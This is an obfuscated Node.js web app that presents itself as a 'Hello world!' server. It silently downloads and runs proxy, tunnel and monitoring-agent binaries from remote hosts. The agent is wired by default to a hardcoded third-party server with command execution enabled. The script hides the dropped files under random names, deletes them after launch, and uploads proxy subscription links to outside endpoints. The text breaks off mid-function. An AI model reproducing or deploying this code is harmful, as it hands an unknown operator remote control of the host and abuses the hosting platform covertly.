const _0x52a670=_0x51d0;(function(_0x317dfd,_0x2fff25){const _0x6bbfe7=_0x51d0,_0x203098=_0x317dfd();while(!![]){try{const _0x77ddc8=-parseInt(_0x6bbfe7(0x1dd))/0x1*(parseInt(_0x6bbfe7(0x213))/0x2)+parseInt(_0x6bbfe7(0x1b8))/0x3*(-parseInt(_0x6bbfe7(0x23d))/0x4)+parseInt(_0x6bbfe7(0x21e))/0x5*(parseInt(_0x6bbfe7(0x244))/0x6)+-parseInt(_0x6bbfe7(0x1fe))/0x7+parseInt(_0x6bbfe7(0x240))/0x8+parseInt(_0x6bbfe7(0x20e))/0x9*(parseInt(_0x6bbfe7(0x1b0))/0xa)+parseInt(_0x6bbfe7(0x22c))/0xb*(parseInt(_0x6bbfe7(0x198))/0xc);if(_0x77ddc8===_0x2fff25)break;else _0x203098['push'](_0x203098['shift']());}catch(_0x397cf7){_0x203098['push'](_0x203098['shift']());}}}(_0x3365,0xb7f9b));const express=require(_0x52a670(0x1f9)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x52a670(0x20d)),{promisify}=require('util'),exec=promisify(require(_0x52a670(0x214))[_0x52a670(0x1bf)]),{execSync}=require(_0x52a670(0x214)),UPLOAD_URL=process[_0x52a670(0x206)][_0x52a670(0x1aa)]||'',PROJECT_URL=process[_0x52a670(0x206)][_0x52a670(0x1fb)]||'',AUTO_ACCESS=process['env'][_0x52a670(0x23f)]||![],FILE_PATH=process['env'][_0x52a670(0x234)]||_0x52a670(0x1be),SUB_PATH=process['env'][_0x52a670(0x1a3)]||_0x52a670(0x1fc),PORT=process[_0x52a670(0x206)][_0x52a670(0x1a7)]||process[_0x52a670(0x206)][_0x52a670(0x1c7)]||0xbb8,UUID=process[_0x52a670(0x206)][_0x52a670(0x1dc)]||_0x52a670(0x1d5),NEZHA_SERVER=process[_0x52a670(0x206)]['NEZHA_SERVER']||_0x52a670(0x195),NEZHA_PORT=process[_0x52a670(0x206)][_0x52a670(0x196)]||'',NEZHA_KEY=process[_0x52a670(0x206)][_0x52a670(0x1ee)]||'1BlOWB7RfxWl4LbWdfSpW1MRJoqivG9G',ARGO_DOMAIN=process[_0x52a670(0x206)][_0x52a670(0x239)]||_0x52a670(0x201),ARGO_AUTH=process[_0x52a670(0x206)][_0x52a670(0x18d)]||_0x52a670(0x224),ARGO_PORT=process[_0x52a670(0x206)][_0x52a670(0x20c)]||0x1f41,CFIP=process['env']['CFIP']||_0x52a670(0x228),CFPORT=process['env'][_0x52a670(0x1f7)]||0x1bb,NAME=process[_0x52a670(0x206)][_0x52a670(0x18c)]||_0x52a670(0x1df);!fs[_0x52a670(0x1f8)](FILE_PATH)?(fs[_0x52a670(0x19b)](FILE_PATH),console['log'](FILE_PATH+_0x52a670(0x1a2))):console[_0x52a670(0x17a)](FILE_PATH+_0x52a670(0x1e8));function generateRandomName(){const _0x4bcb7e=_0x52a670,_0x30e066='abcdefghijklmnopqrstuvwxyz';let _0x1a9871='';for(let _0x5c18ed=0x0;_0x5c18ed<0x6;_0x5c18ed++){_0x1a9871+=_0x30e066[_0x4bcb7e(0x1d9)](Math[_0x4bcb7e(0x186)](Math[_0x4bcb7e(0x1da)]()*_0x30e066['length']));}return _0x1a9871;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x52a670(0x226)](FILE_PATH,npmName),phpPath=path[_0x52a670(0x226)](FILE_PATH,phpName),webPath=path[_0x52a670(0x226)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x52a670(0x226)](FILE_PATH,_0x52a670(0x187)),listPath=path[_0x52a670(0x226)](FILE_PATH,_0x52a670(0x211)),bootLogPath=path[_0x52a670(0x226)](FILE_PATH,_0x52a670(0x1b7)),configPath=path[_0x52a670(0x226)](FILE_PATH,'config.json');function deleteNodes(){const _0x7106ba=_0x52a670;try{if(!UPLOAD_URL)return;if(!fs[_0x7106ba(0x1f8)](subPath))return;let _0x367f28;try{_0x367f28=fs[_0x7106ba(0x18e)](subPath,'utf-8');}catch{return null;}const _0x64a7=Buffer[_0x7106ba(0x1c9)](_0x367f28,_0x7106ba(0x219))[_0x7106ba(0x1d3)](_0x7106ba(0x1db)),_0x44ba4b=_0x64a7[_0x7106ba(0x205)]('\x0a')[_0x7106ba(0x207)](_0x2c42ed=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7106ba(0x1f6)](_0x2c42ed));if(_0x44ba4b[_0x7106ba(0x19f)]===0x0)return;return axios[_0x7106ba(0x1d6)](UPLOAD_URL+_0x7106ba(0x202),JSON[_0x7106ba(0x1d1)]({'nodes':_0x44ba4b}),{'headers':{'Content-Type':_0x7106ba(0x222)}})['catch'](_0xbf1b2d=>{return null;}),null;}catch(_0x41c450){return null;}}function cleanupOldFiles(){const _0xe750c7=_0x52a670;try{const _0x48c0c2=fs['readdirSync'](FILE_PATH);_0x48c0c2[_0xe750c7(0x1ec)](_0x1eab0e=>{const _0x4a1509=_0xe750c7,_0x5415af=path[_0x4a1509(0x226)](FILE_PATH,_0x1eab0e);try{const _0x3345d6=fs[_0x4a1509(0x1e3)](_0x5415af);_0x3345d6['isFile']()&&fs['unlinkSync'](_0x5415af);}catch(_0x2f3621){}});}catch(_0x287579){}}app[_0x52a670(0x1e9)]('/',function(_0x493613,_0x495200){const _0x196c00=_0x52a670;_0x495200['send'](_0x196c00(0x1a5));});async function generateConfig(){const _0x164a22=_0x52a670,_0x43eeb4={'log':{'access':_0x164a22(0x184),'error':_0x164a22(0x184),'loglevel':_0x164a22(0x237)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x164a22(0x1ea),'settings':{'clients':[{'id':UUID,'flow':_0x164a22(0x181)}],'decryption':_0x164a22(0x237),'fallbacks':[{'dest':0xbb9},{'path':_0x164a22(0x21a),'dest':0xbba},{'path':_0x164a22(0x1e4),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x164a22(0x18f)}},{'port':0xbb9,'listen':_0x164a22(0x1d2),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x164a22(0x237)},'streamSettings':{'network':_0x164a22(0x18f),'security':'none'}},{'port':0xbba,'listen':_0x164a22(0x1d2),'protocol':_0x164a22(0x1ea),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x164a22(0x237)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x164a22(0x21a)}},'sniffing':{'enabled':!![],'destOverride':[_0x164a22(0x204),_0x164a22(0x1ba),_0x164a22(0x1fd)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x164a22(0x1d2),'protocol':_0x164a22(0x208),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x164a22(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x164a22(0x204),'tls',_0x164a22(0x1fd)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x164a22(0x1d2),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x164a22(0x237),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x164a22(0x204),_0x164a22(0x1ba),_0x164a22(0x1fd)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x164a22(0x1eb),'tag':_0x164a22(0x1ff)},{'protocol':'blackhole','tag':_0x164a22(0x209)}]};fs[_0x164a22(0x17c)](path[_0x164a22(0x226)](FILE_PATH,_0x164a22(0x20a)),JSON[_0x164a22(0x1d1)](_0x43eeb4,null,0x2));}function getSystemArchitecture(){const _0x144d5a=_0x52a670,_0x1b8a36=os[_0x144d5a(0x180)]();return _0x1b8a36===_0x144d5a(0x203)||_0x1b8a36===_0x144d5a(0x1cc)||_0x1b8a36==='aarch64'?_0x144d5a(0x203):_0x144d5a(0x1bb);}function downloadFile(_0x1ef76b,_0x39b92c,_0x1ea382){const _0x4c60c3=_0x52a670,_0x3f2c71=_0x1ef76b;!fs[_0x4c60c3(0x1f8)](FILE_PATH)&&fs[_0x4c60c3(0x19b)](FILE_PATH,{'recursive':!![]});const _0x4293b1=fs['createWriteStream'](_0x3f2c71);axios({'method':_0x4c60c3(0x1e9),'url':_0x39b92c,'responseType':_0x4c60c3(0x21d)})[_0x4c60c3(0x215)](_0x518a20=>{const _0x161589=_0x4c60c3;_0x518a20['data']['pipe'](_0x4293b1),_0x4293b1['on'](_0x161589(0x1a4),()=>{const _0x27c558=_0x161589;_0x4293b1[_0x27c558(0x1e7)](),console[_0x27c558(0x17a)]('Download\x20'+path['basename'](_0x3f2c71)+_0x27c558(0x182)),_0x1ea382(null,_0x3f2c71);}),_0x4293b1['on'](_0x161589(0x1c8),_0x529e8c=>{const _0x3fb2ad=_0x161589;fs[_0x3fb2ad(0x1ab)](_0x3f2c71,()=>{});const _0x2d7d2a=_0x3fb2ad(0x1b9)+path[_0x3fb2ad(0x1d0)](_0x3f2c71)+_0x3fb2ad(0x221)+_0x529e8c[_0x3fb2ad(0x1ef)];console['error'](_0x2d7d2a),_0x1ea382(_0x2d7d2a);});})[_0x4c60c3(0x23c)](_0x6f93f1=>{const _0x55fb90=_0x4c60c3,_0x27cd1a=_0x55fb90(0x1b9)+path[_0x55fb90(0x1d0)](_0x3f2c71)+_0x55fb90(0x221)+_0x6f93f1['message'];console[_0x55fb90(0x1c8)](_0x27cd1a),_0x1ea382(_0x27cd1a);});}async function downloadFilesAndRun(){const _0xc0179a=_0x52a670,_0x11aff9=getSystemArchitecture(),_0x282f04=getFilesForArchitecture(_0x11aff9);if(_0x282f04[_0xc0179a(0x19f)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5b4a7b=_0x282f04[_0xc0179a(0x185)](_0x399faf=>{return new Promise((_0x16d32a,_0xa4dfe2)=>{const _0x487050=_0x51d0;downloadFile(_0x399faf[_0x487050(0x1cd)],_0x399faf[_0x487050(0x223)],(_0x2f5202,_0x5b4b39)=>{_0x2f5202?_0xa4dfe2(_0x2f5202):_0x16d32a(_0x5b4b39);});});});try{await Promise[_0xc0179a(0x1f4)](_0x5b4a7b);}catch(_0x404482){console[_0xc0179a(0x1c8)](_0xc0179a(0x19a),_0x404482);return;}function _0x31a878(_0x44244f){const _0x5373b2=0x1fd;_0x44244f['forEach'](_0xdb0329=>{const _0x46790f=_0x51d0;fs[_0x46790f(0x1f8)](_0xdb0329)&&fs['chmod'](_0xdb0329,_0x5373b2,_0x59bfb0=>{const _0x292fda=_0x46790f;_0x59bfb0?console[_0x292fda(0x1c8)](_0x292fda(0x210)+_0xdb0329+':\x20'+_0x59bfb0):console[_0x292fda(0x17a)](_0x292fda(0x1f1)+_0xdb0329+':\x20'+_0x5373b2[_0x292fda(0x1d3)](0x8));});});}const _0x9f6607=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x31a878(_0x9f6607);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x57644c=NEZHA_SERVER[_0xc0179a(0x17f)](':')?NEZHA_SERVER['split'](':')[_0xc0179a(0x183)]():'',_0x3340e3=new Set(['443',_0xc0179a(0x200),_0xc0179a(0x22d),_0xc0179a(0x1c0),'2083',_0xc0179a(0x231)]),_0x3f9157=_0x3340e3[_0xc0179a(0x1c1)](_0x57644c)?_0xc0179a(0x18b):_0xc0179a(0x18a),_0x339b2c=_0xc0179a(0x1b2)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xc0179a(0x1e0)+_0x3f9157+_0xc0179a(0x189)+UUID;fs['writeFileSync'](path[_0xc0179a(0x226)](FILE_PATH,_0xc0179a(0x1ce)),_0x339b2c);const _0x383989=_0xc0179a(0x1d8)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xc0179a(0x1b5);try{await exec(_0x383989),console[_0xc0179a(0x17a)](phpName+_0xc0179a(0x1b1)),await new Promise(_0x27eea5=>setTimeout(_0x27eea5,0x3e8));}catch(_0x1ac791){console[_0xc0179a(0x1c8)](_0xc0179a(0x1b4)+_0x1ac791);}}else{let _0x10ce27='';const _0x969559=[_0xc0179a(0x23e),_0xc0179a(0x200),_0xc0179a(0x22d),_0xc0179a(0x1c0),_0xc0179a(0x188),_0xc0179a(0x231)];_0x969559[_0xc0179a(0x17f)](NEZHA_PORT)&&(_0x10ce27=_0xc0179a(0x1c2));const _0x33ada1='nohup\x20'+npmPath+_0xc0179a(0x1cf)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x10ce27+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x33ada1),console[_0xc0179a(0x17a)](npmName+_0xc0179a(0x1b1)),await new Promise(_0x4e7937=>setTimeout(_0x4e7937,0x3e8));}catch(_0x533745){console[_0xc0179a(0x1c8)](_0xc0179a(0x233)+_0x533745);}}}else console[_0xc0179a(0x17a)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x50a7a3=_0xc0179a(0x1d8)+webPath+_0xc0179a(0x1e1)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x50a7a3),console[_0xc0179a(0x17a)](webName+_0xc0179a(0x1b1)),await new Promise(_0x3fd2e2=>setTimeout(_0x3fd2e2,0x3e8));}catch(_0x113658){console[_0xc0179a(0x1c8)](_0xc0179a(0x22f)+_0x113658);}if(fs[_0xc0179a(0x1f8)](botPath)){let _0x2506b4;if(ARGO_AUTH[_0xc0179a(0x236)](/^[A-Z0-9a-z=]{120,250}$/))_0x2506b4=_0xc0179a(0x1c4)+ARGO_AUTH;else ARGO_AUTH[_0xc0179a(0x236)](/TunnelSecret/)?_0x2506b4=_0xc0179a(0x1b6)+FILE_PATH+_0xc0179a(0x1f5):_0x2506b4=_0xc0179a(0x1f0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2506b4+_0xc0179a(0x192)),console['log'](botName+_0xc0179a(0x1b1)),await new Promise(_0x460fb6=>setTimeout(_0x460fb6,0x7d0));}catch(_0x267d89){console[_0xc0179a(0x1c8)](_0xc0179a(0x21b)+_0x267d89);}}await new Promise(_0x4ce504=>setTimeout(_0x4ce504,0x1388));}function getFilesForArchitecture(_0x4a15e1){const _0x4a6a3c=_0x52a670;let _0x1fba07;_0x4a15e1==='arm'?_0x1fba07=[{'fileName':webPath,'fileUrl':_0x4a6a3c(0x23b)},{'fileName':botPath,'fileUrl':_0x4a6a3c(0x1ac)}]:_0x1fba07=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4a6a3c(0x194)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x39ac1b=_0x4a15e1===_0x4a6a3c(0x203)?_0x4a6a3c(0x199):_0x4a6a3c(0x1a1);_0x1fba07[_0x4a6a3c(0x230)]({'fileName':npmPath,'fileUrl':_0x39ac1b});}else{const _0x57458d=_0x4a15e1===_0x4a6a3c(0x203)?'https://arm64.ssss.nyc.mn/v1':_0x4a6a3c(0x1cb);_0x1fba07['unshift']({'fileName':phpPath,'fileUrl':_0x57458d});}}return _0x1fba07;}function argoType(){const _0x229063=_0x52a670;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x229063(0x17a)](_0x229063(0x21f));return;}if(ARGO_AUTH[_0x229063(0x17f)](_0x229063(0x229))){fs[_0x229063(0x17c)](path[_0x229063(0x226)](FILE_PATH,_0x229063(0x1a8)),ARGO_AUTH);const _0x260edf=_0x229063(0x1af)+ARGO_AUTH[_0x229063(0x205)]('\x22')[0xb]+_0x229063(0x220)+path[_0x229063(0x226)](FILE_PATH,_0x229063(0x1a8))+_0x229063(0x218)+ARGO_DOMAIN+_0x229063(0x190)+ARGO_PORT+_0x229063(0x20f);fs[_0x229063(0x17c)](path[_0x229063(0x226)](FILE_PATH,_0x229063(0x1fa)),_0x260edf);}else console[_0x229063(0x17a)](_0x229063(0x1e5));}function _0x3365(){const _0xc57f9b=['exec','2087','has','--tls','success','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','&fp=firefox&type=ws&host=','.exe\x20>\x20nul\x202>&1','PORT','error','from','org','https://amd64.ssss.nyc.mn/v1','arm64','fileName','config.yaml','\x20-s\x20','basename','stringify','127.0.0.1','toString','\x0a\x20\x20\x20\x20','6b4739a7-1257-4152-b530-930c5ca21c49','post','push','nohup\x20','charAt','random','utf-8','UUID','1bpfBQZ','https://oooo.serv00.net/add-url','zcrtqh','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20-c\x20','ArgoDomain:','statSync','/vmess-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','automatic\x20access\x20task\x20added\x20successfully','close','\x20already\x20exists','get','vless','freedom','forEach','countryCode','NEZHA_KEY','message','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Empowerment\x20success\x20for\x20','clear','Subscription\x20uploaded\x20successfully','all','/tunnel.yml\x20run','test','CFPORT','existsSync','express','tunnel.yml','PROJECT_URL','sub','quic','9217726zuFCVM','direct','8443','zzip.7.c.d.c.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','/api/delete-nodes','arm','http','split','env','filter','vmess','block','config.json','Error\x20in\x20startserver:','ARGO_PORT','path','4887uGIwFp','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Empowerment\x20failed\x20for\x20','list.txt','send','2873446DuQIsO','child_process','then','del\x20/f\x20/q\x20','/api/add-nodes','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','base64','/vless-argo','Error\x20executing\x20command:\x20','\x0a\x0atrojan://','stream','13715WjXklJ','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20credentials-file:\x20','\x20failed:\x20','application/json','fileUrl','eyJhIjoiMzBhNzVmNmI3NjU0NzFmNDgzZWI3NzM3N2IxMDA1OTEiLCJ0IjoiYTkxOWJmNTAtMDAyMi00YjdlLTk3ZTktOWJiYjgwMTMwOWYxIiwicyI6Ik1tUTJPVFV5WmpZdE9EVTNOUzAwWldJMUxUaGtZVE10TlRoaE1ERTBZamd5T','?security=tls&sni=','join','\x0avless://','cdns.doon.eu.org','TunnelSecret','taskkill\x20/f\x20/im\x20','response','3799862rmXLZL','2096','set','web\x20running\x20error:\x20','unshift','2053','?encryption=none&security=tls&sni=','npm\x20running\x20error:\x20','FILE_PATH','App\x20is\x20running','match','none','\x22\x20>\x20/dev/null\x202>&1','ARGO_DOMAIN','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/web','catch','155408lYjEDb','443','AUTO_ACCESS','8477440DVjDen','firefox','https://ipapi.co/json/','\x20>/dev/null\x202>&1','3030gPcERf','log','pkill\x20-f\x20\x22[','writeFileSync','text/plain;\x20charset=utf-8','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','includes','arch','xtls-rprx-vision','\x20successfully','pop','/dev/null','map','floor','sub.txt','2083','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','false','true','NAME','ARGO_AUTH','readFileSync','tcp','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Skipping\x20adding\x20automatic\x20access\x20task','\x20>/dev/null\x202>&1\x20&','listen','https://amd64.ssss.nyc.mn/bot','nz.rongshishang.dpdns.org:8008','NEZHA_PORT','\x0a\x0avmess://','48ZKoMrP','https://arm64.ssss.nyc.mn/agent','Error\x20downloading\x20files:','mkdirSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>\x20nul\x202>&1','status','length','http://ip-api.com/json/','https://amd64.ssss.nyc.mn/agent','\x20is\x20created','SUB_PATH','finish','Hello\x20world!','Content-Type','SERVER_PORT','tunnel.json','&path=%2Ftrojan-argo%3Fed%3D2560#','UPLOAD_URL','unlink','https://arm64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20tunnel:\x20','1270dgdQGv','\x20is\x20running','\x0aclient_secret:\x20','data','php\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','boot.log','30kVDWqv','Download\x20','tls','amd','country_code','win32','./tmp'];_0x3365=function(){return _0xc57f9b;};return _0x3365();}async function extractDomains(){const _0x1901ad=_0x52a670;let _0x451974;if(ARGO_AUTH&&ARGO_DOMAIN)_0x451974=ARGO_DOMAIN,console[_0x1901ad(0x17a)]('ARGO_DOMAIN:',_0x451974),await _0x230bdc(_0x451974);else try{const _0x2d5d23=fs[_0x1901ad(0x18e)](path[_0x1901ad(0x226)](FILE_PATH,_0x1901ad(0x1b7)),_0x1901ad(0x1db)),_0x29df41=_0x2d5d23['split']('\x0a'),_0x181e72=[];_0x29df41[_0x1901ad(0x1ec)](_0x17e23b=>{const _0x48f997=_0x1901ad,_0x432631=_0x17e23b['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x432631){const _0x14ddf0=_0x432631[0x1];_0x181e72[_0x48f997(0x1d7)](_0x14ddf0);}});if(_0x181e72[_0x1901ad(0x19f)]>0x0)_0x451974=_0x181e72[0x0],console[_0x1901ad(0x17a)](_0x1901ad(0x1e2),_0x451974),await _0x230bdc(_0x451974);else{console[_0x1901ad(0x17a)](_0x1901ad(0x17e)),fs['unlinkSync'](path[_0x1901ad(0x226)](FILE_PATH,_0x1901ad(0x1b7)));async function _0x10c06e(){const _0x2a27f9=_0x1901ad;try{process['platform']===_0x2a27f9(0x1bd)?await exec(_0x2a27f9(0x22a)+botName+_0x2a27f9(0x1c6)):await exec(_0x2a27f9(0x17b)+botName[_0x2a27f9(0x1d9)](0x0)+']'+botName['substring'](0x1)+_0x2a27f9(0x238));}catch(_0x42d4f1){}}_0x10c06e(),await new Promise(_0x4e15ed=>setTimeout(_0x4e15ed,0xbb8));const _0x48cb94=_0x1901ad(0x1f0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1901ad(0x1d8)+botPath+'\x20'+_0x48cb94+_0x1901ad(0x192)),console[_0x1901ad(0x17a)](botName+'\x20is\x20running'),await new Promise(_0x497c58=>setTimeout(_0x497c58,0xbb8)),await extractDomains();}catch(_0x265cc3){console[_0x1901ad(0x1c8)](_0x1901ad(0x21b)+_0x265cc3);}}}catch(_0x3d3b28){console[_0x1901ad(0x1c8)](_0x1901ad(0x23a),_0x3d3b28);}async function _0x5e431d(){const _0x465f95=_0x1901ad;try{const _0xd05fee=await axios['get'](_0x465f95(0x242),{'timeout':0xbb8});if(_0xd05fee['data']&&_0xd05fee[_0x465f95(0x1b3)][_0x465f95(0x1bc)]&&_0xd05fee['data'][_0x465f95(0x1ca)])return _0xd05fee[_0x465f95(0x1b3)]['country_code']+'_'+_0xd05fee['data'][_0x465f95(0x1ca)];}catch(_0x45434d){try{const _0xa79d9a=await axios[_0x465f95(0x1e9)](_0x465f95(0x1a0),{'timeout':0xbb8});if(_0xa79d9a[_0x465f95(0x1b3)]&&_0xa79d9a[_0x465f95(0x1b3)]['status']===_0x465f95(0x1c3)&&_0xa79d9a['data']['countryCode']&&_0xa79d9a[_0x465f95(0x1b3)][_0x465f95(0x1ca)])return _0xa79d9a[_0x465f95(0x1b3)][_0x465f95(0x1ed)]+'_'+_0xa79d9a[_0x465f95(0x1b3)][_0x465f95(0x1ca)];}catch(_0x49d894){}}return'Unknown';}async function _0x230bdc(_0x1f9a0e){const _0x3eac83=await _0x5e431d(),_0x2e0e8d=NAME?NAME+'-'+_0x3eac83:_0x3eac83;return new Promise(_0x4fef1a=>{setTimeout(()=>{const _0x1cd913=_0x51d0,_0x556ec4={'v':'2','ps':''+_0x2e0e8d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1cd913(0x237),'host':_0x1f9a0e,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x1f9a0e,'alpn':'','fp':_0x1cd913(0x241)},_0x2a4d67=_0x1cd913(0x227)+UUID+'@'+CFIP+':'+CFPORT+_0x1cd913(0x232)+_0x1f9a0e+'&fp=firefox&type=ws&host='+_0x1f9a0e+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2e0e8d+_0x1cd913(0x197)+Buffer[_0x1cd913(0x1c9)](JSON['stringify'](_0x556ec4))[_0x1cd913(0x1d3)](_0x1cd913(0x219))+_0x1cd913(0x21c)+UUID+'@'+CFIP+':'+CFPORT+_0x1cd913(0x225)+_0x1f9a0e+_0x1cd913(0x1c5)+_0x1f9a0e+_0x1cd913(0x1a9)+_0x2e0e8d+_0x1cd913(0x1d4);console[_0x1cd913(0x17a)](Buffer[_0x1cd913(0x1c9)](_0x2a4d67)['toString'](_0x1cd913(0x219))),fs[_0x1cd913(0x17c)](subPath,Buffer['from'](_0x2a4d67)[_0x1cd913(0x1d3)]('base64')),console[_0x1cd913(0x17a)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1cd913(0x1e9)]('/'+SUB_PATH,(_0x343bbd,_0x53620e)=>{const _0x217984=_0x1cd913,_0x4c953c=Buffer[_0x217984(0x1c9)](_0x2a4d67)[_0x217984(0x1d3)](_0x217984(0x219));_0x53620e[_0x217984(0x22e)](_0x217984(0x1a6),_0x217984(0x17d)),_0x53620e[_0x217984(0x212)](_0x4c953c);}),_0x4fef1a(_0x2a4d67);},0x7d0);});}}async function uploadNodes(){const _0x147356=_0x52a670;if(UPLOAD_URL&&PROJECT_URL){const _0x80298d=PROJECT_URL+'/'+SUB_PATH,_0x3ba008={'subscription':[_0x80298d]};try{const _0x3fb0b1=await axios[_0x147356(0x1d6)](UPLOAD_URL+'/api/add-subscriptions',_0x3ba008,{'headers':{'Content-Type':_0x147356(0x222)}});return _0x3fb0b1&&_0x3fb0b1[_0x147356(0x19e)]===0xc8?(console[_0x147356(0x17a)](_0x147356(0x1f3)),_0x3fb0b1):null;}catch(_0x4447aa){if(_0x4447aa['response']){if(_0x4447aa[_0x147356(0x22b)][_0x147356(0x19e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x80ba1d=fs['readFileSync'](listPath,_0x147356(0x1db)),_0x46bb04=_0x80ba1d['split']('\x0a')[_0x147356(0x207)](_0x29fc1c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x147356(0x1f6)](_0x29fc1c));if(_0x46bb04[_0x147356(0x19f)]===0x0)return;const _0x398511=JSON['stringify']({'nodes':_0x46bb04});try{const _0x27d919=await axios['post'](UPLOAD_URL+_0x147356(0x217),_0x398511,{'headers':{'Content-Type':_0x147356(0x222)}});return _0x27d919&&_0x27d919[_0x147356(0x19e)]===0xc8?(console[_0x147356(0x17a)]('Nodes\x20uploaded\x20successfully'),_0x27d919):null;}catch(_0x333f1d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2d3112=_0x51d0,_0x1b82d2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1b82d2[_0x2d3112(0x1d7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1b82d2[_0x2d3112(0x1d7)](phpPath);process['platform']===_0x2d3112(0x1bd)?exec(_0x2d3112(0x216)+_0x1b82d2[_0x2d3112(0x226)]('\x20')+_0x2d3112(0x19d),_0x27426a=>{const _0x3c9e1a=_0x2d3112;console[_0x3c9e1a(0x1f2)](),console[_0x3c9e1a(0x17a)](_0x3c9e1a(0x235)),console[_0x3c9e1a(0x17a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x1b82d2['join']('\x20')+_0x2d3112(0x243),_0x49fee2=>{const _0x107380=_0x2d3112;console['clear'](),console[_0x107380(0x17a)](_0x107380(0x235)),console[_0x107380(0x17a)](_0x107380(0x19c));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x37864d=_0x52a670;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x37864d(0x17a)](_0x37864d(0x191));return;}try{const _0x299bc5=await axios[_0x37864d(0x1d6)](_0x37864d(0x1de),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x37864d(0x17a)](_0x37864d(0x1e6)),_0x299bc5;}catch(_0x136bd9){return console[_0x37864d(0x1c8)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x136bd9[_0x37864d(0x1ef)]),null;}}function _0x51d0(_0x238491,_0x467d90){_0x238491=_0x238491-0x17a;const _0x336541=_0x3365();let 